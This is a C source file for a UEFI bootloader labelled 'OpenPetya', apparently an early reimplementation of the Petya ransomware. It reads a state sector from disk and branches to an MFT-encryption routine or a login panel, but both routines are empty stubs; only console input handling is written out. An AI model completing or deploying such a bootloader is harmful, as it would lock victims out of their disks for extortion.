// bootloader.c

#include <efi.h>
#include <efilib.h>

#include "ntfs.h"
#include "ntfs_crypt.h"
#include "state.h"

#define MAX_ATTEMPTS 3
#define MAX_PW_LEN 32

void clear(EFI_SYSTEM_TABLE *systab)
{
    systab->ConOut->ClearScreen(systab->ConOut);
}

void readline(EFI_SYSTEM_TABLE *systab, CHAR16 *buffer, UINTN max)
{
    UINTN i = 0;
    EFI_INPUT_KEY key;
    EFI_STATUS status;
    UINTN idx;

    // initialize the buffer to be an empty string
    buffer[0] = L'\0';

    while (i < max - 1)
    {
        systab->BootServices->WaitForEvent(1, &systab->ConIn->WaitForKey, &idx);
        status = systab->ConIn->ReadKeyStroke(systab->ConIn, &key);
        if (status != EFI_SUCCESS)
            continue;

        if (key.UnicodeChar == L'\r' || key.UnicodeChar == L'\n')
        {
            CHAR16 newline[] = {
                L'\r',
                L'\n',
                L'\0',
            };
            systab->ConOut->OutputString(systab->ConOut, newline);
            break;
        }

        // handle backspace
        if (key.UnicodeChar == L'\b')
        {
            if (i > 0)
            {
                i--;
                buffer[i] = L'\0';

                // erase the character from the screen
                // in UEFI, sending a backspace moves the cursor back, but doesn't erase.
                CHAR16 erase[] = {
                    L'\b',
                    L' ',
                    L'\b',
                    L'\0',
                };
                systab->ConOut->OutputString(systab->ConOut, erase);
            }

            continue;
        }

        if (key.UnicodeChar >= 0x20)
        {
            buffer[i] = key.UnicodeChar;

            CHAR16 echo[2] = {
                key.UnicodeChar,
                L'\0',
            };
            systab->ConOut->OutputString(systab->ConOut, echo);

            i++;
        }
    }

    // null-termiante the final string
    buffer[i] = L'\0';
}

/// @brief Encrypt MFT
/// @param systab 
void do_encryption(EFI_SYSTEM_TABLE *systab)
{
    clear(systab);

    uint64_t disk_size = state_read_disk_size();
    if (disk_size == 0)
    {

    }
}

/// @brief Login panel
/// @param systab 
void do_login(EFI_SYSTEM_TABLE *systab)
{
    clear(systab);

    
}

/// @brief main function
/// @param image 
/// @param systab 
/// @return 
EFI_STATUS efi_main(EFI_HANDLE image, EFI_SYSTEM_TABLE *systab)
{
    InitializeLib(image, systab);

    systab->ConOut->SetAttribute(systab->ConOut, EFI_WHITE | EFI_BACKGROUND_BLUE);
    clear(systab);
    
    Print(L"OpenPetya (UEFI)\n\n");
    
    systab->ConOut->SetAttribute(systab->ConOut, EFI_LIGHTGRAY | EFI_BACKGROUND_BLACK);

    EFI_STATUS status = init_disk(image);
    if (EFI_ERROR(status))
    {
        Print(L"Error: Cannot find disk\n");
        return status;
    }

    UINT8 state_buffer[512];
    disk_read(60, 1, state_buffer);
    UINT32 magic = *(UINT32 *)state_buffer;
    UINT8 state = state_buffer[4];

    if (magic != 0x424F4F54)
    {
        Print(L"ERROR: State sector invalid\n");
        return EFI_NOT_FOUND;
    }

    if (state == 0x00)
        do_encryption(systab);
    else
        do_login(systab);

    // EFI_INPUT_KEY key;
    // Print(L"Press any key to continue...\n");
    // WaitForSingleEvent(systab->ConIn->WaitForKey, 0);
    // systab->ConIn->ReadKeyStroke(systab->ConIn, &key);

    return EFI_SUCCESS;
}